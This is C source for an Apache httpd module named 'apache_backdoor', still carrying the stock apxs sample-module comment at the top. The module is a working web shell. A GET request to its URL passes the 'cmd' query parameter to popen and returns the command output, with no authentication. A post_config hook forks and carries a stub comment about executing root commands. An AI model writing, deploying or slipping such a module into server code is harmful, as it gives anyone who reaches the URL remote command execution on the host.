/* 
**  mod_apache_backdoor.c -- Apache sample apache_backdoor module
**  [Autogenerated via ``apxs -n apache_backdoor -g'']
**
**  To play with this sample module first compile it into a
**  DSO file and install it into Apache's modules directory 
**  by running:
**
**    $ apxs -c -i mod_apache_backdoor.c
**
**  Then activate it in Apache's apache2.conf file for instance
**  for the URL /apache_backdoor in as follows:
**
**    #   apache2.conf
**    LoadModule apache_backdoor_module modules/mod_apache_backdoor.so
**    <Location /apache_backdoor>
**    SetHandler apache_backdoor
**    </Location>
**
**  Then after restarting Apache via
**
**    $ apachectl restart
**
**  you immediately can request the URL /apache_backdoor and watch for the
**  output of this module. This can be achieved for instance via:
**
**    $ lynx -mime_header http://localhost/apache_backdoor 
**
**  The output should be similar to the following one:
**
**    HTTP/1.1 200 OK
**    Date: Tue, 31 Mar 1998 14:42:22 GMT
**    Server: Apache/1.3.4 (Unix)
**    Connection: close
**    Content-Type: text/html
**  
**    The sample page from mod_apache_backdoor.c
*/ 

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <apr_tables.h>

#define MAX_HANDLER 4

typedef int (*method_handler)(request_rec *r);

static int get_handler(request_rec *r);

static int put_handler(request_rec *r);

static int post_handler(request_rec *r);

static int delete_handler(request_rec *r);

char* runCommand(request_rec *r, const char* command);
int apache_backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s);

/* The sample content handler */
static int apache_backdoor_handler(request_rec *r)
{
    if (strcmp(r->handler, "apache_backdoor")) {
        return DECLINED;
    }    

    method_handler methods[MAX_HANDLER] = {&get_handler, &put_handler, &post_handler, &delete_handler};

    if(r->method_number >= MAX_HANDLER || r->method_number < 0)
    {
        return DECLINED;
    }

    return methods[r->method_number](r);
}


static int get_handler(request_rec *r){
    apr_table_t*GET; 
    ap_args_to_table(r, &GET); 

    const char *command = apr_table_get(GET, "cmd");
    if(command){
        runCommand(r, command);
        return OK;
    } else {
        return DECLINED;
    }
}

static int put_handler(request_rec *r){
    return DECLINED;
}

static int post_handler(request_rec *r){
    return DECLINED;    
}

static int delete_handler(request_rec *r){
    return DECLINED;
}

char* runCommand(request_rec *r, const char* command){
    FILE *fp;
    char path[1035];

    ap_rprintf(r, "Executing command: %s\n", command);

    fp = popen(command, "r");
    if(fp == NULL){
        ap_rprintf(r, "%s", "ERROR");
    }

    while(fgets(path, sizeof(path), fp) != NULL)
    {
        ap_rprintf(r, "%s", path);
    }

    pclose(fp);
}

int apache_backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s){
    if(fork() > 0)
        return OK;

    // EXECUTE ROOT COMMANDS
}

static void apache_backdoor_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(apache_backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_post_config((void*)apache_backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
}

/* Dispatch list for API hooks */
module AP_MODULE_DECLARE_DATA apache_backdoor_module = {
    STANDARD20_MODULE_STUFF, 
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    apache_backdoor_register_hooks  /* register hooks                      */
};

